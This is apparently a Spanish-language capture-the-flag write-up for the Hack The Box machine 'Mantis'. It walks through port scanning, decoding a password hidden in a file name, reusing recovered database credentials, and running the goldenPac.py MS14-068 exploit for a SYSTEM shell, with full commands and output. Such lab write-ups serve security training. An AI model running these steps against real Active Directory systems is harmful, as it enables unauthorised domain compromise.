---
title: "Mantis"
date: 2024-07-22
cover: images/mantis.png
tags: ["hackthebox","Hard"]
categories:
    - "hackthebox"
---

## Reconocimiento

### Nmap

Escaneamos la maquina para ver que puertos tiene abiertos:

```shell
nmap -p- --open --min-rate 5000 -Pn -n 10.10.11.8
```

```
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
1337/tcp  open  waste
1433/tcp  open  ms-sql-s
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5722/tcp  open  msdfsr
8080/tcp  open  http-proxy
9389/tcp  open  adws
47001/tcp open  winrm
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49157/tcp open  unknown
49158/tcp open  unknown
49167/tcp open  unknown
49172/tcp open  unknown
49173/tcp open  unknown
50255/tcp open  unknown
```

### HTTP

En el puerto `1337` parece que hay alojada una web:

![](img/web1.png)

Vamos a hacer fuzzing para ver si tiene mas directorios:

```
> gobuster dir -u http://10.10.10.52:1337/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20

===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.52:1337/
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/orchard              (Status: 500) [Size: 3026]
/secure_notes         (Status: 301) [Size: 160] [--> http://10.10.10.52:1337/secure_notes/]
Progress: 220560 / 220561 (100.00%)
===============================================================
Finished
===============================================================
```

Vamos a ver el directorio `secure_notes`:

Vemos varias cosas:

1. Nombre del directorio

Dentro hay un directorio con este nombre `dev_notes_NmQyNDI0NzE2YzVmNTM0MDVmNTA0MDczNzM1NzMwNzI2NDIx.txt.txt` 

Se puede apreciar una cadena de texto que podemos intentar descifrar:

```
> echo "NmQyNDI0NzE2YzVmNTM0MDVmNTA0MDczNzM1NzMwNzI2NDIx" | base64 -d; echo

6d2424716c5f53405f504073735730726421
```

Ahora nos deja otra cadena que parece `hexadecimal`:

```
> echo "NmQyNDI0NzE2YzVmNTM0MDVmNTA0MDczNzM1NzMwNzI2NDIx" | base64 -d | xxd -ps -r

m$$ql_S@_P@ssW0rd!
```

Tenemos lo que parece un contraseña: `m$$ql_S@_P@ssW0rd!`

2. Contenido

```
1. Download OrchardCMS
2. Download SQL server 2014 Express ,create user "admin",and create orcharddb database
3. Launch IIS and add new website and point to Orchard CMS folder location.
4. Launch browser and navigate to http://localhost:8080
5. Set admin password and configure sQL server connection string.
6. Add blog pages with admin user.
```

Parece que la contraseña es para admin

Nos conectamos ala base de datos:

![](img/db.png)

Vemos que tenemos un usuario y su contraseña

user: `james`
password: `J@m3s_P@ssW0rd!`

Verificamos la contraseña:

```
> crackmapexec smb 10.10.10.52 -u "james" -p "J@m3s_P@ssW0rd!"

SMB         10.10.10.52     445    MANTIS           [*] Windows Server 2008 R2 Standard 7601 Service Pack 1 x64 (name:MANTIS) (domain:htb.local) (signing:True) (SMBv1:True)
SMB         10.10.10.52     445    MANTIS           [+] htb.local\james:J@m3s_P@ssW0rd!
```

Es correcta pero no podemos entrar al sistema con `psexec` por ejemplo

----

## Explotación

### MS14-068 Exploit

Después de probar varias probamos de explotar la vulnerabilidad de `MS14-068` con `goldenPac.py`:

```
> goldenPac.py htb.local/james@mantis

Impacket v0.12.0.dev1+20240718.115833.4e0e3174 - Copyright 2023 Fortra

Password:
[*] User SID: S-1-5-21-4220043660-4019079961-2895681657-1103
[*] Forest SID: S-1-5-21-4220043660-4019079961-2895681657
[*] Attacking domain controller mantis.htb.local
[*] mantis.htb.local found vulnerable!
[*] Requesting shares on mantis.....
[*] Found writable share ADMIN$
[*] Uploading file WZvEaJqE.exe
[*] Opening SVCManager on mantis.....
[*] Creating service xCFW on mantis.....
[*] Starting service xCFW.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>
```

>Nota
>En el comando de `goldenPac` en vez de poner la IP pongo el nombre de dominio que he puesto en el `/etc/hosts` porque a veces da problemas y no funciona el exploit
>Ejemplo:
>`> goldenPac.py htb.local/james@10.10.10.52`
>
>`Impacket v0.12.0.dev1+20240718.115833.4e0e3174 - Copyright 2023 Fortra`
>`Password:`
`[*] User SID: S-1-5-21-4220043660-4019079961-2895681657-1103`
`[*] Forest SID: S-1-5-21-4220043660-4019079961-2895681657`
`[*] Attacking domain controller mantis.htb.local`
`[*] mantis.htb.local seems not vulnerable (Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database))`
>Aquí nos ha dado error

Ya tenemos acceso al sistema como root!

```
C:\Windows\system32>whoami
nt authority\system
```


